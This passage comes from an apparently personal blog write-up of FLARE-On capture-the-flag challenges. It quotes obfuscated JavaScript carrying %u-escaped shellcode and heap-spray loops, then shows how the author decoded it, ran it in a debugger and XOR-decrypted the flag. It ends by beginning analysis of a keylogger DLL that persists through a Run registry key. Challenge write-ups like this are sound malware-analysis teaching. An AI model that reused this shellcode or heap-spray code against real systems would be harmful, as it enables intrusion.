<span style="color: #2AA198">uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8</span>
<span style="color: #2AA198">b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u726</span>
<span style="color: #2AA198">2%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%</span>
<span style="color: #2AA198">u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2</span>
<span style="color: #2AA198">c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua31</span>
<span style="color: #2AA198">6%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%</span>
<span style="color: #2AA198">u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u9</span>
<span style="color: #2AA198">8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f</span>
<span style="color: #2AA198">f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%</span>
<span style="color: #2AA198">u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5</span>
<span style="color: #2AA198">068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&quot;</span><span style="color: #93A1A1">);</span>

    <span style="color: #586E75">// not important</span>
    <span style="color: #268BD2">var</span> <span style="color: #93A1A1">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;&quot;</span><span style="color: #93A1A1">;</span>
    <span style="color: #719e07">for</span> <span style="color: #93A1A1">(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">=</span><span style="color: #2AA198">128</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">&gt;=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span><span style="color: #719e07">--</span><span style="color: #93A1A1">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA)</span> <span style="color: #93A1A1">MPBPtdcBjTlpvyTYkSwgkrWhXL</span><span style="color: #719e07">+=</span> <span style="color: #93A1A1">unescape(</span><span style="color: #2AA198">&quot;%ub32f%u3791&quot;</span><span style="color: #93A1A1">);</span>
    <span style="color: #93A1A1">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">MPBPtdcBjTlpvyTYkSwgkrWhXL</span> <span style="color: #719e07">+</span> <span style="color: #93A1A1">IxTUQnOvHg;</span>
    <span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">unescape(</span><span style="color: #2AA198">&quot;%ub32f%u3791&quot;</span><span style="color: #93A1A1">);</span>
    <span style="color: #93A1A1">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">;</span>
    <span style="color: #93A1A1">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS</span><span style="color: #719e07">+</span><span style="color: #93A1A1">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length</span>
    <span style="color: #719e07">while</span> <span style="color: #93A1A1">(OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length</span><span style="color: #719e07">&lt;</span><span style="color: #93A1A1">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA)</span> <span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT</span><span style="color: #719e07">+=</span><span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;</span>
    <span style="color: #93A1A1">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);</span>
    <span style="color: #93A1A1">MOysyGgYplwyZzNdETHwkru</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length</span><span style="color: #719e07">-</span><span style="color: #93A1A1">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);</span>
    <span style="color: #719e07">while</span><span style="color: #93A1A1">(MOysyGgYplwyZzNdETHwkru.length</span><span style="color: #719e07">+</span><span style="color: #93A1A1">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA</span> <span style="color: #719e07">&lt;</span> <span style="color: #2AA198">0x40000</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">MOysyGgYplwyZzNdETHwkru</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">MOysyGgYplwyZzNdETHwkru</span><span style="color: #719e07">+</span><span style="color: #93A1A1">MOysyGgYplwyZzNdETHwkr</span><span style="color: #719e07">+</span><span style="color: #93A1A1">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;</span>
    <span style="color: #93A1A1">DPwxazRhwbQGu</span> <span style="color: #719e07">=</span> <span style="color: #719e07">new</span> <span style="color: #B58900">Array</span><span style="color: #93A1A1">();</span>
    <span style="color: #719e07">for</span> <span style="color: #93A1A1">(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">&lt;</span><span style="color: #2AA198">100</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">++</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">MOysyGgYplwyZzNdETHwkru</span> <span style="color: #719e07">+</span> <span style="color: #93A1A1">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;</span>

    <span style="color: #719e07">for</span> <span style="color: #93A1A1">(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">=</span><span style="color: #2AA198">142</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">&gt;=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;</span><span style="color: #719e07">--</span><span style="color: #93A1A1">EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA)</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span style="color: #719e07">+=</span> <span style="color: #93A1A1">unescape(</span><span style="color: #2AA198">&quot;%ub550%u0166&quot;</span><span style="color: #93A1A1">);</span>
    <span style="color: #93A1A1">bGtvKT</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length</span> <span style="color: #719e07">+</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">;</span>
        <span style="color: #719e07">while</span> <span style="color: #93A1A1">(zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length</span> <span style="color: #719e07">&lt;</span> <span style="color: #93A1A1">bGtvKT)</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span style="color: #719e07">+=</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;</span>
    <span style="color: #93A1A1">Juphd</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">bGtvKT);</span>
    <span style="color: #93A1A1">QCZabMzxQiD</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length</span><span style="color: #719e07">-</span><span style="color: #93A1A1">bGtvKT);</span>
    <span style="color: #719e07">while</span><span style="color: #93A1A1">(QCZabMzxQiD.length</span><span style="color: #719e07">+</span><span style="color: #93A1A1">bGtvKT</span> <span style="color: #719e07">&lt;</span> <span style="color: #2AA198">0x40000</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">QCZabMzxQiD</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">QCZabMzxQiD</span><span style="color: #719e07">+</span><span style="color: #93A1A1">QCZabMzxQiD</span><span style="color: #719e07">+</span><span style="color: #93A1A1">Juphd;</span>
    <span style="color: #93A1A1">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE</span> <span style="color: #719e07">=</span> <span style="color: #719e07">new</span> <span style="color: #B58900">Array</span><span style="color: #93A1A1">();</span>
    <span style="color: #719e07">for</span> <span style="color: #93A1A1">(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">=</span><span style="color: #2AA198">0</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">&lt;</span><span style="color: #2AA198">125</span><span style="color: #93A1A1">;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA</span><span style="color: #719e07">++</span><span style="color: #93A1A1">)</span> <span style="color: #93A1A1">FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]</span><span style="color: #719e07">=</span> <span style="color: #93A1A1">QCZabMzxQiD</span> <span style="color: #719e07">+</span> <span style="color: #93A1A1">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable <code>IxTUQnOvHg</code> looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. <code>%u72f9</code> should be converted to <code>0xf972</code>. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: <a href="http://sandsprite.com/shellcode_2_exe.php" target="_blank">http://sandsprite.com/shellcode_2_exe.php</a>.</p>

<p>After running the executable in Immunity debugger a message box pops up with an encoded message. If we look inside memory, we can find this string:</p>

<p><img src="/images/2014/flare/4-1.jpg" alt="MessageBox Text" title="MessageBox Text" /></p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>First string in hex</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">2574243575216</span><span style="color: #268BD2">B2A36366B2F3274752E2A2305316B203723256B2B2D46</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The length is close to the email (29 bytes). Here&rsquo;s what I thought. If it is the email then the last 13 bytes should be <code>@flare-on.com</code>. It&rsquo;s probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If <code>plaintext xor key = ciphertext</code> then <code>key = plaintext xor ciphertext</code>. If we xor the last 13 bytes of ciphertext with <code>@flare-on.com</code> then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a <code>one time pad</code>) it is repeated.</p>

<p>The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>First string xor</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #719e07">def</span> <span style="color: #268BD2">xor</span><span style="color: #93A1A1">(mydata,mykey):</span>
    <span style="color: #93A1A1">keylen</span> <span style="color: #719e07">=</span> <span style="color: #B58900">len</span><span style="color: #93A1A1">(mykey)</span>
    <span style="color: #93A1A1">datalen</span> <span style="color: #719e07">=</span> <span style="color: #B58900">len</span><span style="color: #93A1A1">(mydata)</span>
    
    <span style="color: #586E75"># easier to just extend the key array, but probably not that efficient</span>
    <span style="color: #586E75"># not that we care about it here ;)</span>
    <span style="color: #93A1A1">key</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">mykey</span> <span style="color: #719e07">*</span> <span style="color: #93A1A1">(</span> <span style="color: #93A1A1">(datalen</span><span style="color: #719e07">/</span><span style="color: #93A1A1">keylen)</span><span style="color: #719e07">+</span><span style="color: #2AA198">1</span> <span style="color: #93A1A1">)</span> 
    
    <span style="color: #719e07">return</span> <span style="color: #2AA198">&#39;&#39;</span><span style="color: #719e07">.</span><span style="color: #93A1A1">join(</span><span style="color: #B58900">chr</span><span style="color: #93A1A1">(</span><span style="color: #B58900">ord</span><span style="color: #93A1A1">(a)</span> <span style="color: #719e07">^</span> <span style="color: #B58900">ord</span><span style="color: #93A1A1">(b))</span> <span style="color: #719e07">for</span> <span style="color: #93A1A1">a,b</span> <span style="color: #719e07">in</span> <span style="color: #B58900">zip</span><span style="color: #93A1A1">(mydata,key))</span>
    
<span style="color: #719e07">from</span> <span style="color: #93A1A1">binascii</span> <span style="color: #719e07">import</span> <span style="color: #93A1A1">hexlify,</span> <span style="color: #93A1A1">unhexlify</span>

<span style="color: #586E75"># last 13 bytes</span>
<span style="color: #93A1A1">ciphertext</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">unhexlify(</span><span style="color: #2AA198">&quot;2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46&quot;</span><span style="color: #93A1A1">)[</span><span style="color: #719e07">-</span><span style="color: #2AA198">13</span><span style="color: #93A1A1">:]</span> 
<span style="color: #93A1A1">plaintext</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;@flare-on.com&quot;</span>

<span style="color: #719e07">print</span> <span style="color: #93A1A1">xor(ciphertext,plaintext)</span>
<span style="color: #719e07">print</span> <span style="color: #93A1A1">hexlify(</span> <span style="color: #93A1A1">xor</span> <span style="color: #93A1A1">(ciphertext,plaintext)</span> <span style="color: #93A1A1">)</span>

<span style="color: #586E75"># result - :(</span>
<span style="color: #586E75"># jEiPE</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Nope. Doesn&rsquo;t look like it.</p>

<p>I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more <code>OWNED!!!</code> strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select <code>Follow in Dump</code>. Select the string  and again right click and select <code>Copy &gt; To clipboard</code>. It&rsquo;s in Unicode so <code>5</code> represented as <code>0x0035</code> instead of <code>0x35</code>.</p>

<p><img src="/images/2014/flare/4-2.jpg" alt="Interesting String" title="Interesting String" /></p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Second string in hex</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">#</span> <span style="color: #268BD2">I</span> <span style="color: #B58900">di</span><span style="color: #268BD2">d</span> <span style="color: #268BD2">not</span> <span style="color: #268BD2">select</span> <span style="color: #268BD2">the</span> <span style="color: #268BD2">first</span> <span style="color: #2AA198">00</span> <span style="color: #268BD2">before</span> <span style="color: #2AA198">5</span> <span style="color: #93A1A1">(</span><span style="color: #2AA198">0x0035</span><span style="color: #93A1A1">)</span>
<span style="color: #93A1A1">00143868</span>  <span style="color: #93A1A1">35</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">24</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">74</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">25</span> <span style="color: #93A1A1">00</span>  <span style="color: #93A1A1">5</span><span style="color: #268BD2">.$.t.</span><span style="color: #719e07">%</span><span style="color: #268BD2">.</span>
<span style="color: #93A1A1">00143870</span>  <span style="color: #93A1A1">2</span><span style="color: #268BD2">A</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">6</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">21</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">75</span> <span style="color: #2AA198">00</span>  <span style="color: #719e07">*</span><span style="color: #268BD2">.k.</span><span style="color: #93A1A1">!</span><span style="color: #268BD2">.u.</span>
<span style="color: #93A1A1">00143878</span>  <span style="color: #93A1A1">2</span><span style="color: #268BD2">F</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">6</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">36</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">36</span> <span style="color: #2AA198">00</span>  <span style="color: #719e07">/</span><span style="color: #268BD2">.k.6.6.</span>
<span style="color: #93A1A1">00143880</span>  <span style="color: #93A1A1">2</span><span style="color: #268BD2">E</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">75</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">74</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">32</span> <span style="color: #2AA198">00</span>  <span style="color: #268BD2">..u.t.2.</span>
<span style="color: #93A1A1">00143888</span>  <span style="color: #93A1A1">31</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">05</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">23</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">2</span><span style="color: #268BD2">A</span> <span style="color: #2AA198">00</span>  <span style="color: #2AA198">1</span><span style="color: #268BD2">.</span><span style="color: #93A1A1"></span><span style="color: #268BD2">.#.</span><span style="color: #719e07">*</span><span style="color: #268BD2">.</span>
<span style="color: #93A1A1">00143890</span>  <span style="color: #93A1A1">23</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">37</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">20</span> <span style="color: #93A1A1">00</span> <span style="color: #93A1A1">6</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">00</span>  <span style="color: #93A1A1">#</span><span style="color: #268BD2">.7.</span> <span style="color: #268BD2">.k.</span>
<span style="color: #93A1A1">00143898</span>  <span style="color: #93A1A1">2</span><span style="color: #268BD2">D</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">2</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">6</span><span style="color: #268BD2">B</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">25</span> <span style="color: #2AA198">00</span>  <span style="color: #719e07">-</span><span style="color: #268BD2">.</span><span style="color: #719e07">+</span><span style="color: #268BD2">.k.</span><span style="color: #719e07">%</span><span style="color: #268BD2">.</span>
<span style="color: #93A1A1">001438</span><span style="color: #268BD2">A0</span>  <span style="color: #2AA198">2</span><span style="color: #268BD2">D</span> <span style="color: #2AA198">00</span> <span style="color: #2AA198">28</span>                 <span style="color: #719e07">-</span><span style="color: #268BD2">.</span><span style="color: #93A1A1">(</span>

<span style="color: #93A1A1">#</span> <span style="color: #268BD2">or</span> <span style="color: #268BD2">in</span> <span style="color: #268BD2">Python</span><span style="color: #719e07">-</span><span style="color: #268BD2">friendly</span> <span style="color: #268BD2">format</span>
<span style="color: #93A1A1">352474252</span><span style="color: #268BD2">a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Let&rsquo;s apply the xor-logic on this string too.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Second string xor</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75"># add xor function from last example</span>
<span style="color: #719e07">from</span> <span style="color: #93A1A1">binascii</span> <span style="color: #719e07">import</span> <span style="color: #93A1A1">hexlify,</span> <span style="color: #93A1A1">unhexlify</span>

<span style="color: #586E75"># last 13 bytes</span>
<span style="color: #93A1A1">ciphertext</span> <span style="color: #719e07">=</span> <span style="color: #93A1A1">unhexlify(</span><span style="color: #2AA198">&quot;352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28&quot;</span><span style="color: #93A1A1">)[</span><span style="color: #719e07">-</span><span style="color: #2AA198">13</span><span style="color: #93A1A1">:]</span> 
<span style="color: #93A1A1">plaintext</span> <span style="color: #719e07">=</span> <span style="color: #2AA198">&quot;@flare-on.com&quot;</span>

<span style="color: #719e07">print</span> <span style="color: #93A1A1">xor(ciphertext,plaintext)</span>
<span style="color: #719e07">print</span> <span style="color: #93A1A1">hexlify(</span> <span style="color: #93A1A1">xor</span> <span style="color: #93A1A1">(ciphertext,plaintext)</span> <span style="color: #93A1A1">)</span>

<span style="color: #586E75"># result :)</span>
<span style="color: #586E75"># EEFBEEFBEEFBE</span>
<span style="color: #586E75"># 45454642454546424545464245</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Bingo. The key is <code>BEEF</code>. It is also in the initial shellcode as a string. Let&rsquo;s xor it with the complete string and get the flag.</p>

<h4 id="level-4-flag-wa1ch-d3m-spl01ts-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 4 flag: wa1ch.d3m.spl01ts@flare-on.com</h4>

<hr />

<h2 id="a-name-ch5-a-challenge-5-5get-about-it:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch5"></a> Challenge 5 - 5get About It</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Another one bites the dust!
Here&#39;s some more fun for you, password is the same as always.
-FLARE
</pre></div>

<h3 id="be-sure-to-run-this-challenge-in-a-vm:94bf06dd1bee42f6b34a1ff79274f7e7">Be sure to run this challenge in a VM.</h3>

<p>The file inside the challenge zip is named <code>5get_it</code> and is around 100KBs. A quick look with <code>HxD</code> says it&rsquo;s a Portable Executable (MZ and PE magic bytes). Let&rsquo;s get some help from <code>PE-Studio</code>. It has a VirusTotal score of 29/55 with most AVs calling it a generic trojan or keylogger. Click on <code>Imported Symbols</code> and look at the red symbols. Some of them are more interesting than others. To get more information about any of them, right click and select <code>Query MSDN</code> inside PE-Studio (handy, neh?).</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Interesting symbols</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #268BD2">RegSetValueExA</span> <span style="color: #719e07">-</span> <span style="color: #268BD2">RegCreateKeyA</span><span style="color: #93A1A1">:</span> <span style="color: #268BD2">Messing</span> <span style="color: #268BD2">with</span> <span style="color: #268BD2">registry</span>
<span style="color: #268BD2">CreateFileW</span> <span style="color: #719e07">-</span> <span style="color: #268BD2">CreateFileA</span> <span style="color: #719e07">-</span> <span style="color: #268BD2">WriteFile</span> <span style="color: #719e07">-</span> <span style="color: #268BD2">CopyFileA</span><span style="color: #93A1A1">:</span> <span style="color: #268BD2">Creating</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">writing</span> <span style="color: #268BD2">to</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">and</span> <span style="color: #268BD2">copying</span> <span style="color: #268BD2">file</span>
<span style="color: #93A1A1">GetAsyncKeyState:</span> <span style="color: #93A1A1">&quot;</span><span style="color: #268BD2">Determines</span> <span style="color: #268BD2">whether</span> <span style="color: #268BD2">a</span> <span style="color: #268BD2">key</span> <span style="color: #268BD2">is</span> <span style="color: #268BD2">up</span> <span style="color: #268BD2">or</span> <span style="color: #268BD2">down</span> <span style="color: #268BD2">at</span> <span style="color: #268BD2">the</span> <span style="color: #268BD2">time</span> <span style="color: #268BD2">the</span> <span style="color: #268BD2">function</span> <span style="color: #268BD2">is</span> <span style="color: #268BD2">called</span><span style="color: #93A1A1">,</span> <span style="color: #268BD2">and</span> <span style="color: #268BD2">whether</span> <span style="color: #268BD2">the</span> <span style="color: #268BD2">key</span> <span style="color: #268BD2">was</span> <span style="color: #268BD2">pressed</span> <span style="color: #268BD2">after</span> <span style="color: #268BD2">a</span> <span style="color: #268BD2">previous</span> <span style="color: #268BD2">call</span> <span style="color: #268BD2">to</span> <span style="color: #268BD2">GetAsyncKeyState</span><span style="color: #93A1A1">&quot;</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Also, let&rsquo;s run <code>strings</code> on it. I used <a href="https://www.cygwin.com/" target="_blank">cygwin</a>. I have omitted the garbage and only kept the interesting strings:</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Interesting strings</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #268BD2">$</span> <span style="color: #268BD2">strings.exe</span> <span style="color: #2AA198">5</span><span style="color: #268BD2">get_it</span>
<span style="color: #268BD2">svchost.log</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">SHIFT</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">RETURN</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">BACKSPACE</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">TAB</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">CTRL</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">DELETE</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">[</span><span style="color: #268BD2">CAPS</span> <span style="color: #268BD2">LOCK</span><span style="color: #93A1A1">]</span>
<span style="color: #268BD2">SOFTWARE</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">Microsoft</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">Windows</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">CurrentVersion</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">Run</span>
<span style="color: #268BD2">svchost</span>
<span style="color: #93A1A1">c:\</span><span style="color: #268BD2">windows</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">system32</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">svchost.dll</span>
<span style="color: #93A1A1">c:\</span><span style="color: #268BD2">windows</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">system32</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">rundll32.exe</span> <span style="color: #268BD2">c</span><span style="color: #93A1A1">:\</span><span style="color: #268BD2">windows</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">system32</span><span style="color: #93A1A1">\</span><span style="color: #268BD2">svchost.dll</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>While doing the challenge only the first and last two lines were interesting to me.</p>

<ul>
<li>It references <code>c:\windows\system32\svchost.dll</code> and <code>svchost.log</code> but there is no such file (Windows has <code>svchost.exe</code> in that location).</li>
<li>There is also <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in <code>DllMain</code>.</li>
</ul>

